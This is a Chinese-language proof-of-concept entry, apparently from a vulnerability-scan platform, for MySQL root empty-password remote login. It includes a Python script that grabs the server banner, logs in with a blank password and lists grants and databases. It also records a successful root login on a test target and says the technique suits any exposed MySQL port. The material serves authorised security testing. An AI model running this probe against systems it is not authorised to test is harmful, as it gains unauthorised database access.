# MySQL root 空口令远程直连检测（只读取证脚本）

- **code**: mysql-root-空口令远程直连检测-只读取证脚本
- **kind**: poc
- **category**: weak-password
- **cve**: -
- **component**: MySQL 5.x/8.x
- **versions**: MySQL 8.0.x（实测 8.0.43）；5.7 亦适用（鉴权插件不同但空口令面一致）
- **severity**: critical
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 在 chat-5277mm-com 靶标的 203.0.113.90:3310 上实测通过：握手版本 8.0.43，root@%（caching_sha2_password）空口令直连成功，返回 current_user=root@%，grants 含 ALL PRIVILEGES+GRANT OPTION+FILE+SUPER。同款手法可复用于任意暴露的 MySQL 端口。
- **path**: pocs/mysql-root-空口令远程直连检测-只读取证脚本/mysql_empty_root_probe.py
- **tags**: mysql,空口令,未授权,数据库,caching_sha2_password
- **created_at**: 2026-10-21T17:08:54.506Z
- **found_by**: vuln-scan

## 描述

通用只读检测：MySQL 暴露端口上 root 空口令（或任意可空口令账号）的可远程直连性。先读 TCP 握手包确认协议与版本，再以 password="" 直连；连上后只看 show grants / show databases / 版本，不做任何写操作，避免在授权范围内留下改动。

## 用法

```
python mysql_empty_root_probe.py <HOST> <PORT> [user]
示例（本次实测）：python mysql_empty_root_probe.py 203.0.113.90 3310 root
等价客户端命令：mysql -h <HOST> -P <PORT> -uroot --connect-timeout=8 -e "select version(),current_user(),@@hostname;"
依赖：pymysql（pip install pymysql）
```

## 正文

```
#!/usr/bin/env python3
# MySQL 未授权/空口令 只读探测 + 取证（不写、不落文件、不上 UDF）
# 用法: python mysql_empty_root_probe.py HOST PORT [user]
import sys, socket, json
HOST = sys.argv[1]; PORT = int(sys.argv[2]); USER = sys.argv[3] if len(sys.argv) > 3 else "root"

def banner():
    s = socket.create_connection((HOST, PORT), timeout=8)
    hdr = s.recv(4)
    ln = hdr[0] | (hdr[1] << 8) | (hdr[2] << 16)
    data = b""
    while len(data) < ln:
        c = s.recv(ln - len(data))
        if not c: break
        data += c
    s.close()
    # protocol 10 -> 0x0A, 之后是 NUL 结尾的版本串
    return data[1:data.index(b"\x00", 1)].decode("latin1", "replace")

print("[banner] MySQL version =", banner())

try:
    import pymysql
    conn = pymysql.connect(host=HOST, port=PORT, user=USER, password="",
                           connect_timeout=8, read_timeout=20, charset="utf8mb4")
    cur = conn.cursor()
    cur.execute("select version(), current_user(), @@hostname, @@secure_file_priv")
    print("[login] OK empty password ->", cur.fetchone())
    for q in ("show grants for '%s'@'%%'" % USER, "show databases"):
        try:
            cur.execute(q)
            print("[%s] %s" % (q[:24], cur.fetchall()))
        except Exception as e:
            print("[%s] ERR %r" % (q[:24], e))
    conn.close()
except Exception as e:
    print("[login] FAILED:", repr(e))

```
